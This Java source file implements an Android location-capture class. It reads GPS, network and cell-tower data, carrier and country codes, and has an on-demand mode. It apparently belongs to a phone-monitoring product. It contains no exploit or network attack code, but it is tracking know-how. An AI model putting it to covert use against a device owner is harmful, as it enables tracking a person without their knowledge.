package com.vvt.capture.location;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.ConditionVariable;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

import com.vvt.base.FxEvent;
import com.vvt.capture.location.glocation.GLocation;
import com.vvt.capture.location.glocation.GLocation.ConversionException;
import com.vvt.capture.location.settings.LocationOption;
import com.vvt.capture.location.util.GeneralUtil;
import com.vvt.capture.location.util.LocationCallingModule;
import com.vvt.capture.location.util.NetworkUtil;
import com.vvt.events.FxLocationEvent;
import com.vvt.events.FxLocationMapProvider;
import com.vvt.events.FxLocationMethod;
import com.vvt.logger.FxLog;

public class GettingLocation implements LocationListenerManager.Callback {

	/* ==================================== CONSTANT ====================================*/
	private static final String TAG = "GettingLocation";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	@SuppressWarnings("unused")
	private static final boolean LOGE = Customization.ERROR;
	
	private static final long LOCATION_QUALITY_TIME_INTERVAL = ((1000 * 60) * 1); // 1
																					// minute

	/* ===================================== MEMBER =====================================*/
	private Timer mTimeoutTimer;
	private TimerTask mTimeoutTask;

	private LocationListenerManager mLocationListenerManager;
	private LocationManager mLocationManager;
	private GettingLocation.Callback mCaptureListener;

	// private Location mNewLocation;
	private Location mCurrentLocation;

	private boolean mIsEnabled = false;
	private boolean mIsRegisAlready = false;
	private LocationOption mlocationOption;
	private Context mContext;

	private ServicePhoneStateListener mPhoneStateListener;
	private TelephonyManager mTelephonyManager;
	private ConditionVariable mConditionVariable;

	/* ===================================== METHOD ===================================== */

	public GettingLocation(Context context, LocationOption locationOption,
			GettingLocation.Callback listener) {
		mContext = context;
		mlocationOption = locationOption;
		mCaptureListener = listener;
		mLocationManager = (LocationManager) mContext
				.getSystemService(Context.LOCATION_SERVICE);
		mTelephonyManager = (TelephonyManager) mContext
				.getSystemService(Context.TELEPHONY_SERVICE);
		mConditionVariable = new ConditionVariable();
	}

	/**
	 * Enable capture location
	 */
	public void enable() {
		if(LOGV) FxLog.v(TAG, "enable # ENTER ...");

		if (mIsEnabled) {
			if (!mlocationOption.iskeepState()
					|| mlocationOption.getCallingModule() == LocationCallingModule.MODULE_LOCATION_ON_DEMAND) {
				disable();
			}
		}
		mIsEnabled = true;

		if(LOGV) FxLog.v(TAG, "enable # Waiting for location ...[x]");

		requestLocation();
	}

	/**
	 * Disable capture location.
	 */
	public void disable() {
		if(LOGV) FxLog.v(TAG, "disable # ENTER ...");

		if (mIsEnabled) {
			mIsEnabled = false;

			unregisterLocationListener();
			cancelTimeoutTask();
		}
		
		if(LOGV) FxLog.v(TAG, "disable # EXIT ...");
	}

	private void requestLocation() {

		if(LOGV) FxLog.v(TAG, "requestLocation # ENTER ...");

		if(LOGD) FxLog.d(TAG, String.format("mLocationManager.getProviders # %s",
				mLocationManager.getProviders(true).toString()));
		if(LOGD) FxLog.d(TAG, String.format(
				"mLocationManager.getProviders(true).size() # %s",
				mLocationManager.getProviders(true).size()));

		if (mLocationManager.getProviders(true).toString().contains("gps")
				|| mLocationManager.getProviders(true).toString()
						.contains("network")) {
			// Register location listener
			registerLocationListener();

			// Schedule time out task
			scheduleTimeoutTask();
		} else {
			getGoogleLocation();
			
		}
		
		if(LOGV) FxLog.v(TAG, "requestLocation # EXIT ...");
	}

	private void registerLocationListener() {
		if(LOGV) FxLog.v(TAG, "registerLocationListener # ENTER ...");
		
		if (mLocationListenerManager == null) {
			mLocationListenerManager = new LocationListenerManager(mContext,
					this);
		}

		if (!mIsRegisAlready) {
			mLocationListenerManager.register();
		}
		mIsRegisAlready = true;

		if(LOGV) FxLog.v(TAG, "registerLocationListener # EXIT ...");
	}

	private void unregisterLocationListener() {
		if(LOGV) FxLog.v(TAG, "unregisterLocationListener # ENTER ...");
		
		if (mIsRegisAlready && mLocationListenerManager != null) {
			mLocationListenerManager.unregister();
			mLocationListenerManager = null;
			mIsRegisAlready = false;
		}

		if(LOGV) FxLog.v(TAG, "unregisterLocationListener # EXIT ...");
	}

	private void scheduleTimeoutTask() {
		if(LOGV) FxLog.v(TAG, "scheduleTimeoutTask # ENTER ...");

		// Timeout task
		mTimeoutTask = new TimerTask() {
			@Override
			public void run() {
				FxLog.v(TAG, "scheduleTimeoutTask.run # ENTER ...");
				startTimeoutTask();
				FxLog.v(TAG, "scheduleTimeoutTask.run # EXIT ...");
			}
		};

		// Timeout timer
		if (mTimeoutTimer == null) {
			mTimeoutTimer = new Timer();
		}
		mTimeoutTimer.schedule(mTimeoutTask, mlocationOption.getTimeOut());
		if(LOGV) FxLog.v(TAG, "scheduleTimeoutTask # EXIT ...");
	}

	private void startTimeoutTask() {
		if(LOGV) FxLog.v(TAG, "startTimeoutTask # ENTER ...");
		if(LOGD) FxLog.d(TAG, "startTimeoutTask # GPS REQUEST TIMEOUT!!!");

		// Unregister location listener
		if (!mlocationOption.iskeepState()
				|| mlocationOption.getCallingModule() == LocationCallingModule.MODULE_LOCATION_ON_DEMAND) {
			unregisterLocationListener();
		}

		//starting get Glocation
		getGoogleLocation();
		
		if(LOGV) FxLog.v(TAG, "startTimeoutTask # EXIT ...");
	}

	private void cancelTimeoutTask() {
		if(LOGV) FxLog.v(TAG, "cancelTimeoutTask # ENTER ...");
		if (mTimeoutTask != null) {
			mTimeoutTask.cancel();
			mTimeoutTask = null;
		}
		
		if(LOGV)  FxLog.v(TAG, "cancelTimeoutTask # EXIT ...");
	}

	public void onLocationChanged(Location location) {
		if(LOGV) FxLog.v(TAG, "onLocationChanged # ENTER ...");
		if(LOGV) FxLog.v(TAG,
				String.format(
						"onLocationChanged # time: %s, provider: %s, lat: %f, long: %f, acc: %f",
						GeneralUtil.getDateFormatter().format(
								new Date(location.getTime())),
						location.getProvider(), location.getLatitude(),
						location.getLongitude(), location.getAccuracy()));

		// Unregister location listener
		if (!mlocationOption.iskeepState()
				|| mlocationOption.getCallingModule() == LocationCallingModule.MODULE_LOCATION_ON_DEMAND) {
			unregisterLocationListener();
		}

		// Cancel timeout task
		cancelTimeoutTask();

		// if API return last known location we will get from glocation.
		if (!isLastKnownLocation(location)) {
			// Capture location
			captureLocation(location, FxLocationMapProvider.UNKNOWN);
		} else {
			Location gLocation = findGoogleLocation();
			if (gLocation == null) {
				if(LOGD) FxLog.d(TAG, "Get Glocation FAIL!!");

				captureLocation(gLocation, FxLocationMapProvider.UNKNOWN);

			} else {
				// Request location from Google service
				if(LOGD) FxLog.d(TAG, "Get Glocation Success.");
				captureLocation(gLocation,
						FxLocationMapProvider.PROVIDER_GOOGLE);
			}
		}

		if(LOGV) FxLog.v(TAG, "onLocationChanged # EXIT ...");

	}

	private boolean isLastKnownLocation(Location location) {
		
		// gogle always return last known location from Network Porvider so we
		// should check it.
		if (location.getProvider().equals(LocationManager.NETWORK_PROVIDER)) {
			
//			//only ON_DEMAND we will check the same location
//			if (mlocationOption.getCallingModule() == LocationCallingModule.MODULE_LOCATION_ON_DEMAND) {
//				FxLog.e(TAG,
//						"isLastKnownLocation # Check isSameLocation : MODULE_LOCATION_ON_DEMAND");
//				if(mCurrentLocation != null && location != null) {
//					if(isSameLocation(mCurrentLocation, location)) {
//						FxLog.e(TAG,
//								"isLastKnownLocation # isSameLocation!!");
//						return true;
//					} else {
//							FxLog.e(TAG,
//									"isLastKnownLocation # NOT SAME mCurrentLocation NOT null.");
//					}
//				} else {
//					if(mCurrentLocation == null) {
//						FxLog.e(TAG,
//								"isLastKnownLocation # NOT SAME mCurrentLocation is null!!");
//					} 
//				}
//			}
			
			Location gLocation = findGoogleLocation();
			if (gLocation == null) {
				if(LOGD) FxLog.d(TAG,
						"isLastKnownLocation # Can't get G_Location, NO internet connection.");
				if(LOGV) FxLog.v(TAG,
						"onLocationChanged # isLastKnownLocation : YES ...");
				return true;
			} else {
				if(LOGD) FxLog.d(TAG,
						"isLastKnownLocation # Can get G_Location, HAVE internet connection.");
				if(LOGV) FxLog.v(TAG, "onLocationChanged # isLastKnownLocation : NO ...");
				return false;
			}
		}
		return false;

	}
	
//	private boolean isSameLocation(Location actualLocation, Location raceLocation) {
//		if(actualLocation.getAccuracy() == raceLocation.getAccuracy()
//				&& actualLocation.getAltitude() == raceLocation.getAltitude()
//				&& actualLocation.getLatitude() == raceLocation.getLatitude()
//				&& actualLocation.getLongitude() == raceLocation.getLongitude()) {
//			return true;
//		} else {
//			return false;
//		}
//	}

	private void getGoogleLocation() {
		Location gLocation = findGoogleLocation();
		if (gLocation == null) {
			if(LOGD) FxLog.d(TAG, "Get Glocation FAIL!!");

			// Capture location
			captureLocation(gLocation, FxLocationMapProvider.UNKNOWN);

		} else {
			// Request location from Google service
			if(LOGD) FxLog.d(TAG, "Get Glocation Success.");
			captureLocation(gLocation, FxLocationMapProvider.PROVIDER_GOOGLE);
		}
	}

	private void captureLocation(Location newLocation,
			FxLocationMapProvider provider) {
		if(LOGV) FxLog.v(TAG, "captureLocation # ENTER ...");

		if (mCurrentLocation == null) {
			mCurrentLocation = newLocation;
		} else {
			if (isBetterLocation(newLocation)) {
				if(LOGD) FxLog.d(TAG, "compareLocation # isBetterLocation : true ");
				mCurrentLocation = newLocation;
			}
		}

		List<FxEvent> events = new ArrayList<FxEvent>();

		if (newLocation == null) {
			events.add(keepLocation(provider, true));
		} else {
			events.add(keepLocation(provider, false));
		}

		if(LOGV) FxLog.v(TAG, "captureLocation # EXIT ...");

		// call back.
		if (events.size() > 0) {
			// FxLocationEvent event = (FxLocationEvent) events.get(0);

			// // if it don't have any information we not return back to the
			// caller.
			// if(event.getCellId() > 0 || event.getLatitude() != 0 ||
			// event.getLongitude() != 0) {
			if(LOGD) FxLog.d(TAG,  "captureLocation #return information back to the caller "); 
			mCaptureListener.onLocationChanged(events);
			// }else {
			// Log.w
			// (TAG,"captureLocation # No information for return back to the caller ");
			// }
		} 
		
//		//if onDemand Event we will call back ti call
//		if (mlocationOption.getCallingModule() == LocationCallingModule.MODULE_LOCATION_ON_DEMAND) {
//			mCaptureListener.onLocationChanged(events);
//		}
		
	}

	private Location findGoogleLocation() {
		if(LOGV) FxLog.v(TAG, "findGoogleLocation # ENTER ...");

		boolean hasInternet = NetworkUtil.hasInternetConnection(mContext);

		if (!hasInternet) {
			if(LOGV) FxLog.v(TAG,
					"findGoogleLocation # No Internet connection -> return null");
			return null;
		}

		Location location = null;
		try {
			GLocation cellLocationToLocation = GLocation.getInstance(mContext);

			location = cellLocationToLocation
					.getLocationOfCurrentCellLocation();
		} catch (ConversionException e) {
			// Do nothing
		}
		
		if(LOGV) FxLog.v(TAG, "findGoogleLocation # EXIT ...");
		return location;
	}

	private FxLocationEvent keepLocation(FxLocationMapProvider provider,
			boolean newLocationIsNull) {
		
		if(LOGV) FxLog.v(TAG, "keepLocation # ENTER ...");
		// info callback's format.
		FxLocationEvent locationEvent = new FxLocationEvent();

		// Location info.
		boolean isMockLocation = true;
		double lat = 0;
		double lon = 0;
		double altitude = 0;
		long time = 0;
		float speed = 0;
		float speedAccuracy = 0;
		float heading = 0;
		float headingAccuracy = 0;
		float horizontalAccuracy = -1;
		float verticalAccuracy = -1;
		String aProvider = "unknown";
		FxLocationMethod pMethod = FxLocationMethod.CELL_INFO; // it alway
																// return cellID
		FxLocationMapProvider pProvider = FxLocationMapProvider.UNKNOWN;

		// TelephonyManager
		int mnc;
		int phoneType;
		int mcc;
		long cellId = 0;
		String mobileCountryCode = "unknown";
		long areaCode = 0;
		String networkName = "unknown";
		String networkId = "unknown";
		String cellName = "unknown";

		if (mCurrentLocation != null && !newLocationIsNull) {

			if(LOGV) FxLog.v(TAG,
					String.format(
							"keepLocation # time: %s, provider: %s, lat: %f, long: %f, acc: %f",
							GeneralUtil.getDateFormatter().format(
									new Date(mCurrentLocation.getTime())),
							mCurrentLocation.getProvider(),
							mCurrentLocation.getLatitude(),
							mCurrentLocation.getLongitude(),
							mCurrentLocation.getAccuracy()));

			isMockLocation = false;
			lat = mCurrentLocation.getLatitude();
			lon = mCurrentLocation.getLongitude();
			altitude = mCurrentLocation.getAltitude();
			time = mCurrentLocation.getTime();

			if (mCurrentLocation.hasSpeed()) {
				speed = mCurrentLocation.getSpeed();
			}

			if (mCurrentLocation.hasBearing()) {
				heading = mCurrentLocation.getBearing();
			} else {
				heading = 500f;
			}

			aProvider = mCurrentLocation.getProvider();

			if (aProvider.equals(LocationManager.GPS_PROVIDER)) {
				pMethod = FxLocationMethod.INTERGRATED_GPS;
				pProvider = FxLocationMapProvider.UNKNOWN;

			} else if (aProvider.equals(LocationManager.NETWORK_PROVIDER)) {
				// check if this is G-Location
				if (provider == FxLocationMapProvider.PROVIDER_GOOGLE) {
					pMethod = FxLocationMethod.CELL_INFO;
					pProvider = FxLocationMapProvider.PROVIDER_GOOGLE;

				} else if (provider == FxLocationMapProvider.UNKNOWN) {
					pMethod = FxLocationMethod.NETWORK;
					pProvider = FxLocationMapProvider.UNKNOWN;
				}
			} else {
				pMethod = FxLocationMethod.CELL_INFO;
				pProvider = FxLocationMapProvider.UNKNOWN;
			}

			if (mCurrentLocation.hasAccuracy()) {
				horizontalAccuracy = mCurrentLocation.getAccuracy();
			} else {
				horizontalAccuracy = -1;
			}
		}

		
		Thread thd = new Thread(new Runnable() {

			public void run() {
				Looper.prepare();
				registerPhoneStateListener();
				Looper.loop();

			}
		});

		thd.start();

		// if get service state from listener.
		if (mConditionVariable.block(2000)) {
			// Reset the condition to the closed state.
			mConditionVariable.close();

			unregisterPhoneStateListener();

			networkName = mTelephonyManager.getNetworkOperatorName();

			mnc = mContext.getResources().getConfiguration().mnc;
			networkId = String.valueOf(mnc);

			// get cell id base on phone type
			phoneType = mTelephonyManager.getPhoneType();

			if (phoneType == TelephonyManager.PHONE_TYPE_CDMA) {
				CdmaCellLocation location1 = (CdmaCellLocation) mTelephonyManager
						.getCellLocation();
				if (location1 != null) {
					cellId = location1.getBaseStationId();
				}
			} else if (phoneType == TelephonyManager.PHONE_TYPE_GSM) {
				GsmCellLocation location1 = (GsmCellLocation) mTelephonyManager
						.getCellLocation();
				if (location1 != null) {
					cellId = location1.getCid();
				}
			}
			// validate cellId value (Android return -1 if can't get cell ID
			// in this case set cell ID to 0)
			cellId = (cellId == -1) ? 0 : cellId;

			mcc = mContext.getResources().getConfiguration().mcc;
			mobileCountryCode = String.valueOf(mcc);

		} else {
			unregisterPhoneStateListener();
			// Reset the condition to the closed state.
			mConditionVariable.close();
		}

		// prepare data for callback to the caller
		locationEvent.setIsMockLocaion(isMockLocation);
		locationEvent.setLatitude(lat);
		locationEvent.setLongitude(lon);
		locationEvent.setAltitude(altitude);
		locationEvent.setEventTime(time);
		locationEvent.setSpeed(speed);
		locationEvent.setSpeedAccuracy(speedAccuracy);
		locationEvent.setHeading(heading);
		locationEvent.setHeadingAccuracy(headingAccuracy);
		locationEvent.setHorizontalAccuracy(horizontalAccuracy);
		locationEvent.setVerticalAccuracy(verticalAccuracy);
		locationEvent.setMethod(pMethod);
		locationEvent.setMapProvider(pProvider);
		locationEvent.setNetworkName(networkName);
		locationEvent.setNetworkId(networkId);
		locationEvent.setCellName(cellName);
		locationEvent.setCellId(cellId);
		locationEvent.setMobileCountryCode(mobileCountryCode);
		// this field is not yet implement.
		locationEvent.setAreaCode(areaCode);

		if(LOGV) FxLog.v(TAG, "keepLocation # EXIT ...");
		return locationEvent;

	}

	// /////////////////////////// Location optimization methods ////////////////////////////////

	/**
	 * Determines whether one Location reading is better than the current
	 * Location fix
	 * 
	 * @param location
	 *            The new Location that you want to evaluate
	 * @param currentBestLocation
	 *            The current Location fix, to which you want to compare the new
	 *            one
	 */
	private boolean isBetterLocation(Location newLocation) {
		if(LOGV) FxLog.v(TAG, "... isBetterLocation() ...");

		if (newLocation == null) {
			if(LOGV) FxLog.v(TAG, "New location is null, return false");
			return false;
		}

		// Check whether the new location fix is newer or older
		long timeDelta = newLocation.getTime() - mCurrentLocation.getTime();
		boolean isSignificantlyNewer = timeDelta > LOCATION_QUALITY_TIME_INTERVAL;
		boolean isSignificantlyOlder = timeDelta < -LOCATION_QUALITY_TIME_INTERVAL;
		boolean isNewer = timeDelta > 0;

		// If it's been more than two minutes since the current location, use
		// the new location
		// because the user has likely moved
		if (isSignificantlyNewer) {
			return true;
			// If the new location is more than two minutes older, it must be
			// worse
		} else if (isSignificantlyOlder) {
			return false;
		}

		// Check whether the new location fix is more or less accurate
		int accuracyDelta = (int) (newLocation.getAccuracy() - mCurrentLocation
				.getAccuracy());
		boolean isLessAccurate = accuracyDelta > 0;
		boolean isMoreAccurate = accuracyDelta < 0;
		boolean isSignificantlyLessAccurate = accuracyDelta > 200;

		// Check if the old and new location are from the same provider
		boolean isFromSameProvider = isSameProvider(newLocation.getProvider(),
				mCurrentLocation.getProvider());

		// Determine location quality using a combination of timeliness and
		// accuracy
		if (isMoreAccurate) {
			return true;
		} else if (isNewer && !isLessAccurate) {
			return true;
		} else if (isNewer && !isSignificantlyLessAccurate
				&& isFromSameProvider) {
			return true;
		}
		return false;
	}

	/** Checks whether two providers are the same */
	private boolean isSameProvider(String provider1, String provider2) {
		if (provider1 == null) {
			return provider2 == null;
		}
		return provider1.equals(provider2);
	}

	public interface Callback {
		void onLocationChanged(List<FxEvent> event);
	}

	private void registerPhoneStateListener() {
		mPhoneStateListener = new ServicePhoneStateListener();
		mTelephonyManager.listen(mPhoneStateListener,
				PhoneStateListener.LISTEN_SERVICE_STATE);
	}

	private void unregisterPhoneStateListener() {
		if (mPhoneStateListener != null) {
			mTelephonyManager.listen(mPhoneStateListener,
					PhoneStateListener.LISTEN_NONE);
			mPhoneStateListener = null;
		}
	}

	// Service phone state listener
	private final class ServicePhoneStateListener extends PhoneStateListener {
		@Override
		public void onServiceStateChanged(ServiceState serviceState) {
			super.onServiceStateChanged(serviceState);
			if(LOGV) FxLog.v(TAG, "! onServiceStateChanged !");

			int state = serviceState.getState();
			FxLog.v(TAG, "> onServiceStateChanged # State: " + state);
			if (state == ServiceState.STATE_IN_SERVICE) {
				if(LOGV) FxLog.v(TAG,
						"> onServiceStateChanged # Current State is IN_SERVICE, let validate SIM data");
				mConditionVariable.open();
			} else {
				if(LOGD) FxLog.d(TAG, "> onServiceStateChanged # Current State is not IN_SERVICE");
			}
		}
	}

}
